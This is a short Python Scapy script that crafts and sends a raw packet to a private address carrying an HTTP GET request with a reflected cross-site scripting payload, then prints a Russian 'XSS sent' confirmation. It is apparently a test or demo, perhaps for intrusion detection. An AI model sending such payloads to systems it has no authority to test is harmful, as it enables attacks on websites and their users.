from scapy.all import *

xss_packet = IP(dst="192.168.1.1")/TCP(dport=80)/Raw(
    load="GET /search?q=<script>alert('hacked')</script> HTTP/1.1\r\nHost: test.com\r\n\r\n"
)
send(xss_packet, verbose=0)
print("✅ Отправлен XSS")
